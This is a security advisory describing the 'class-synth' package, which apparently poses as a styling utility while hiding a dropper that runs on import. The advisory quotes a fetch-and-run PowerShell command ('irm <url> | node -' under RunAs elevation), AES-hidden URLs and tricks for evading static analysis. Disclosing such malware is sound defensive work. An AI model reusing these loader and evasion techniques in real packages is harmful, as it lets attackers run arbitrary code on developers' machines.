summary: class-synth: import-time dropper executes remote code with admin privileges via elevated PowerShell
details: Package is advertised as a class-merging styling utility (clsx/twMerge shape) but its main bundle runs a covert dropper on require/import. An IIFE in dist/index.js walks the consumer's current working directory for.css files containing an `@sri-hash:` marker, AES-256-CBC decrypts the marker contents with a hardcoded key into a URL, then spawns an elevated PowerShell (`Start-Process powershell... -Verb RunAs`) to execute `irm <url> | node -`, fetching and running arbitrary remote JavaScript with administrator rights. Node builtins are imported via dynamic name construction to evade static analysis (`await import(["node","fs"].join(":"))`, same for `path`, `child_process`, `crypto`), and `process` is fetched via `new Function('return typeof process!== "undefined"? process: null;')` to dodge regex grep. The malicious init is buried among hundreds of dead-code filler exports (applyPreset1..150, createSequenceStep1..250, isWithinBoundary1..200, mapOperation1..250, checkConstraint1..250) to disguise the payload. The dropper writes `debug_log.txt` to the consumer's cwd with INIT START / HASH FOUND / ENDPOINT / SPAWNED PID markers — a deliberate loader workflow, not utility-library behavior. Functionality has zero relation to the package's stated purpose.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
